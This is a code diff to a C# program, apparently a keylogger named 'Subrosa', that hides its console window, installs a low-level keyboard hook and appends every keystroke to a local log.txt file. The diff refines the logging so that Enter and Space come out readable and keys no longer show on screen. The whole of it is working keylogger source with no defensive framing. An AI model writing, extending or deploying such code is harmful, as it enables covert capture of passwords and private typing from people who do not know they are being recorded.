@@ -43,8 +43,6 @@ namespace Subrosa
         public static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
-
-           
             ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
@@ -60,10 +58,26 @@ namespace Subrosa
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                int vkCode = Marshal.ReadInt32(lParam);
-                Console.WriteLine((Keys)vkCode);
+
+                //Console.WriteLine((Keys)vkCode);
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                sw.Write((Keys)vkCode);
+                int vkCode = Marshal.ReadInt32(lParam);
+
+                switch (vkCode)
+                {
+                    case 13:
+                        sw.WriteLine("");
+                        break;
+                    case 32: //space
+                        sw.Write(" ");
+                        break;
+                    
+                    default:
+                        sw.Write((Keys)vkCode);
+                        break;
+                }
+                
+                
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
